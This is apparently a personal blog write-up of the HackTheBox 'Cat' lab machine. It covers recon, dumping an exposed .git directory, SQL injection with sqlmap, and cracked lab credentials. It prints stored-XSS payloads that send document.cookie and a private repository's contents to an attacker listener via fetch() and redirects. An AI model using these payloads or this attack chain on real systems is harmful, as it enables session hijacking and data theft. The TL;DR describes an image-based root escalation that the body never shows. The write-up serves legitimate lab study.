---
title: HackTheBox Cat Writeup
authors: Samarth
date: 2025-03-03 15:00:00 +0530
categories: [HackTheBox, Machines]
tags: [Linux, Apache, Cross-Site Scripting, SQL Injection]
math: true
mermaid: true
---

![Cat - HTB](/assets/images/writeups/Cat-HTB/banner.png)

## TL;DR

This writeup covers the [__Cat__](https://app.hackthebox.com/machines/Cat){:target="_blank"} machine, an easy-rated Linux box. Initial enumeration revealed open ports 22 (SSH) and 80 (Apache), with a website offering user registration, login, and image uploads. Adding `cat.htb` to `/etc/hosts` enabled proper domain resolution. A .git directory was exposed on the web server, allowing me to dump and analyze the source code using `gitdumper`. Reviewing `join.php`, I found a Stored XSS vulnerability, which I exploited to hijack an admin session. Further analysis of `accept_cat.php` revealed an SQL Injection flaw accessible only to admins. Using the stolen session, I extracted user credentials from the database and cracked the hashes to gain SSH access. For privilege escalation, I found a root-owned image processing script vulnerable to code execution. By crafting a malicious image payload, I obtained a root shell and captured the flag.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports 22 and 80, corresponding to OpenSSH, and Apache 2.4.41. Here are the results from the Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn 10.10.11.53 -oN scan/normal.scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-27 21:49 IST
Nmap scan report for cat.htb (10.10.11.53)
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Best Cat Competition
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH and HTTP services were detected. Next, I proceeded with HTTP enumeration.

## Enumeration

The Nmap scan revealed that the IP address was linked to the domain `cat.htb`. Therefore, I added this domain to the `"/etc/hosts"` file.

![Cat Website](/assets/images/writeups/Cat-HTB/1.png)

While observing the website, I came discovered `/join.php` which asks you to register a user.

![Registering a user](/assets/images/writeups/Cat-HTB/2.png)

After successfully registering, I was able to log in and submit cat details, which included an upload feature for the `Best Cat Competition`. The upload functionality explicitly states that only `JPG`, `JPEG`, and `PNG` files are allowed.

Before proceeding, I performed directory fuzzing to discover hidden files and directories on the website.

```javascript
dirsearch -u http://cat.htb/ -x 403,400,404 -o dir.fuzz 

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: dir.fuzz

Target: http://cat.htb/

[22:55:30] Starting: 
[22:55:43] 301 -  301B  - /.git  ->  http://cat.htb/.git/
[22:55:44] 200 -    7B  - /.git/COMMIT_EDITMSG
[22:55:44] 200 -   73B  - /.git/description
[22:55:44] 200 -   23B  - /.git/HEAD
[22:55:44] 200 -   92B  - /.git/config
[22:55:44] 200 -    2KB - /.git/index
[22:55:44] 200 -  240B  - /.git/info/exclude
[22:55:44] 200 -  150B  - /.git/logs/HEAD
[22:55:44] 301 -  311B  - /.git/logs/refs  ->  http://cat.htb/.git/logs/refs/
[22:55:44] 200 -  150B  - /.git/logs/refs/heads/master
[22:55:44] 301 -  317B  - /.git/logs/refs/heads  ->  http://cat.htb/.git/logs/refs/heads/
[22:55:44] 301 -  312B  - /.git/refs/heads  ->  http://cat.htb/.git/refs/heads/
[22:55:44] 200 -   41B  - /.git/refs/heads/master
[22:55:44] 301 -  311B  - /.git/refs/tags  ->  http://cat.htb/.git/refs/tags/
[22:56:07] 302 -    1B  - /admin.php  ->  /join.php
[22:56:49] 200 -    1B  - /config.php
[22:56:53] 301 -  300B  - /css  ->  http://cat.htb/css/
[22:57:12] 301 -  300B  - /img  ->  http://cat.htb/img/
[22:57:24] 302 -    0B  - /logout.php  ->  /
[22:58:19] 301 -  304B  - /uploads  ->  http://cat.htb/uploads/

Task Completed
```

While enumerating directories, I discovered an interesting one: `/.git`. Although directory listing is restricted, its contents remain accessible.

I can use `gitdumper` to extract all accessible references and logs from `/.git`.

```bash
./gitdumper.sh http://cat.htb/.git/ git-out          
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating git-out/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/c9/e281ffb3f5431800332021326ba5e97aeb2764
[+] Downloaded: objects/56/03bb235ee634e1d7914def967c26f9dd0963bb
[+] Downloaded: objects/64/d98c5af736de120e17eff23b17e22aad668718
[+] Downloaded: objects/31/e87489c5f8160f895e941d00087bea94f21315
[+] Downloaded: objects/0c/be0133fb00b13165bd7318e42e17f322daac7f
[+] Downloaded: objects/6f/ae98c9ae65a9ecbf37e821e7bafb48bcdac2bc
[+] Downloaded: objects/91/92afa265e9e73f533227e4f118f882615d3640
[+] Downloaded: objects/0f/fa90ae01a4f353aa2f6b2de03c212943412222
[+] Downloaded: objects/b8/7b8c6317f8e419dac2c3ce3517a6c93b235028
[+] Downloaded: objects/26/bd62c92bcf4415f2b82514bbbac83936c53cb5
[+] Downloaded: objects/38/660821153b31dbbee89396eacf974c095ab0dc
[+] Downloaded: objects/58/62718ef94b524f3e36627e6f2eae1e3570a7f4
[+] Downloaded: objects/b7/df8d295f9356332f9619ae5ecec3230a880ef2
[+] Downloaded: objects/88/12266cb97013f416c175f9a9fa08aae524c92a
[+] Downloaded: objects/cf/8166a8873d413e6afd88fa03305880e795a2c6
[+] Downloaded: objects/9a/dbf70baf0e260d84d9c8666a0460e75e8be4a8
[+] Downloaded: objects/48/21d0cd8fecc8c3579be5735b1aab69f1637c86
[+] Downloaded: objects/7b/a662bf012ce71d0db9e86c80386b7ae0a54ea1
[+] Downloaded: objects/9b/e1a76f22449a7876a712d34dc092f477169c36
[+] Downloaded: objects/09/7745b30047ab3d3e6e0c5239c2dfd5cac308a5
```

Once the dumping process is complete, I can use the `extractor` tool to retrieve files from the downloaded `.git` directory.

```bash
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########

[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/accept_cat.php
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/admin.php
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/config.php
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/contest.php
[+] Found folder: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/css
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/css/styles.css
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/delete_cat.php
[+] Found folder: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/img
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/img/cat1.jpg
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/img/cat2.png
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/img/cat3.webp
[+] Found folder: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/img_winners
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/img_winners/cat1.jpg
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/img_winners/cat2.png
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/img_winners/cat3.webp
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/index.php
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/join.php
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/logout.php
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/view_cat.php
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/vote.php
[+] Found file: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/winners.php
[+] Found folder: ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/winners
[+] Found file:  ext-git-out/0-8c2c2701eb4e3c9a42162cfb7b681b6166287fd5/winners/cat_report_20240831_173129.php

```

After extracting all the files from the `.git` directory, I analyzed the `.php` files and discovered `join.php`, which handles user registration on the website.

Upon reviewing the code, I noticed that user data is directly stored in the database during registration without proper filtering. This vulnerability leads to `Stored Cross-Site Scripting (XSS)`.

```plaintext
file - join.php
``` 
![join.php - Stored XSS](/assets/images/writeups/Cat-HTB/3.png)

In `admin.php`, I discovered that the `admin` username is `axel`.

```plaintext
filename - admin.php
```

![admin.php - axel](/assets/images/writeups/Cat-HTB/4.png)

In `accept_cat.php`, user input is passed through the `catName` parameter without any filtration and is directly used in SQL queries. This page is accessible by the admin user.

```plaintext
file - accept_me.php
```

![accept_cat.php - SQL Injection](/assets/images/writeups/Cat-HTB/5.png)

## Exploitation

Let's begin with `Stored XSS`, as there is no input filtration.

```Javascript
Payload - <script>document.location='http://10.10.xx.xx:4444/?c='+document.cookie;</script>
```

Since it's a Stored XSS, I have to start a listener.

```python
python -m http.server 4444
```

![Stored XSS - username](/assets/images/writeups/Cat-HTB/6.png)

After submitting the form, I logged in as the same user.

![Cat submission](/assets/images/writeups/Cat-HTB/7.png)

I successfully captured the `admin user's session ID` in the listener. Using this session ID, I logged in as the admin.

![Admin Panel](/assets/images/writeups/Cat-HTB/8.png)

Recalling my previous findings, I noted that the catName parameter in `accept_cat.php` is vulnerable to `SQL Injection`.

![accept_cat.php](/assets/images/writeups/Cat-HTB/9.png)

After capturing the request in `Burp Suite`, I will now use it in `SQLMap` to exploit the vulnerability.

![sqlmap](/assets/images/writeups/Cat-HTB/10.png)

![tables](/assets/images/writeups/Cat-HTB/11.png)

Next, I retrieved the contents of the user table.

![User table content](/assets/images/writeups/Cat-HTB/12.png)

I then attempted to crack the passwords and successfully cracked the password for the rosa user.

![Rosa Password](/assets/images/writeups/Cat-HTB/13.png)

```plaintext
rosa:soyunaprincesarosa
```

Next, I used the obtained credentials to log in via SSH.

![SSH shell](/assets/images/writeups/Cat-HTB/14.png)

I successfully gained a shell as the `rosa` user, but I need to escalate privileges and log in as `axel`.

To achieve this, I will check the `Apache server logs`, as the `access.log` file stores information related to logins.

![Axel Password](/assets/images/writeups/Cat-HTB/15.png)

```plaintext
Axel:aNdZwgC4tI9gnVXv_e3Q
```

Next, I used the credentials to log in as `axel`.

![Axel User](/assets/images/writeups/Cat-HTB/16.png)

## Post Exploitation

I checked the current user's privileges using `sudo -l`, but `axel` is not part of the sudoers group.

While exploring the machine, I discovered an email in `/var/mail/axel`.

![Mail](/assets/images/writeups/Cat-HTB/17.png)

From the email, I observed that the `Gitea` service is running as a new web service. To confirm this, I checked for open ports using `netstat -a`.

![Netstat](/assets/images/writeups/Cat-HTB/18.png)

The `Gitea` web service is running on port `3000`. To access it, I will perform port forwarding to my localhost.

Next, I will use `axel`'s credentials to log in to Gitea.

![Gitea Login](/assets/images/writeups/Cat-HTB/20.png)

While browsing the webpage, I discovered that an `outdated version of Gitea` is running on the system.

![Outdated Version](/assets/images/writeups/Cat-HTB/21.png)

Next, I searched for exploits targeting this outdated version.

![Exploits](/assets/images/writeups/Cat-HTB/22.png)

`Gitea 1.22.0` is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. This vulnerability allows an attacker to inject malicious scripts that get stored on the server and executed in the context of another user's session.

Recalling the email found in `/var/mail/axel`, I noted the URL for a private repository.

![Axel Mail](/assets/images/writeups/Cat-HTB/23.png)

Now, I will leverage both the private repository and the Stored XSS vulnerability in `Gitea 1.22.0` to escalate access.

```Javascript
<a href="javascript:fetch('http://10.10.xx.xx:4444/?d='+encodeURIComponent(btoa(document.cookie)));">XSS test</a>
```

```Javascript
echo -e "Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/samh4cks" | sendmail jobert@cat.htb
```

Next, I will create a new repository named `samh4cks` and set the description as the XSS payload.

```Javascript
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.xx.xx:4444/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```

In the response, I successfully retrieved the `admin` credentials after decrypting the data.


```PHP
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
```

![Root user](/assets/images/writeups/Cat-HTB/24.png)


![Machine Pwned](/assets/images/writeups/Cat-HTB/Pwned.png)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.